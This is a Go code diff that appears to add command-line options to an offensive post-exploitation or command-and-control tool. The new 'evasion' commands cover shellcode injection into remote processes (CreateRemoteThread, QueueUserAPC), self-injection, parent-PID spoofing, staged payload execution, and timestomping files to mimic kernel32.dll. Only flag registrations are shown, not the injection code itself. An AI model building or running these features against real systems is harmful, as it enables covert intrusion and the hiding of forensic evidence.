@@ -2072,6 +2072,42 @@ func init() {
 	// Add to root command
 	rootCmd.AddCommand(persistenceCmd)
 	rootCmd.AddCommand(consoleCmd)
+
+	// Level 2 evasion: inject
+	rootCmd.AddCommand(injectCmd)
+	injectCmd.AddCommand(injectRemoteCmd)
+	injectCmd.AddCommand(injectSelfCmd)
+	injectCmd.AddCommand(injectPPIDCmd)
+
+	injectRemoteCmd.Flags().String("file", "", "Local shellcode file path (required)")
+	injectRemoteCmd.Flags().Uint32("pid", 0, "Target process PID (required)")
+	injectRemoteCmd.Flags().StringP("method", "m", "crt", "Injection method: crt (CreateRemoteThread) | apc (QueueUserAPC)")
+	injectRemoteCmd.Flags().Bool("wait", false, "Wait for injection result")
+	injectRemoteCmd.Flags().Int("timeout", 60, "Seconds to wait for result")
+
+	injectSelfCmd.Flags().String("file", "", "Local shellcode file path (required)")
+	injectSelfCmd.Flags().Bool("wait", false, "Wait for execution result")
+	injectSelfCmd.Flags().Int("timeout", 60, "Seconds to wait for result")
+
+	injectPPIDCmd.Flags().Uint32("ppid", 0, "Parent PID to spoof")
+	injectPPIDCmd.Flags().String("ppid-name", "", "Parent process name to spoof (e.g. explorer.exe)")
+	injectPPIDCmd.Flags().String("args", "", "Arguments for the spawned process")
+	injectPPIDCmd.Flags().Bool("wait", false, "Wait for spawn result")
+	injectPPIDCmd.Flags().Int("timeout", 60, "Seconds to wait for result")
+
+	// Level 2 evasion: staged
+	rootCmd.AddCommand(stagedCmd)
+	stagedCmd.Flags().StringP("method", "m", "self", "Injection method: self | crt | apc")
+	stagedCmd.Flags().Uint32("pid", 0, "Target PID (required for crt/apc methods)")
+	stagedCmd.Flags().Bool("wait", false, "Wait for execution result")
+	stagedCmd.Flags().Int("timeout", 60, "Seconds to wait for result")
+
+	// Level 2 evasion: timestomp
+	rootCmd.AddCommand(timestompCmd)
+	timestompCmd.Flags().String("ref", "", "Reference file to copy timestamps from (default: kernel32.dll)")
+	timestompCmd.Flags().String("time", "", "Explicit timestamp in RFC3339 format (e.g. 2021-06-15T09:00:00Z)")
+	timestompCmd.Flags().Bool("wait", false, "Wait for timestomp result")
+	timestompCmd.Flags().Int("timeout", 30, "Seconds to wait for result")
 }
 
 func main() {
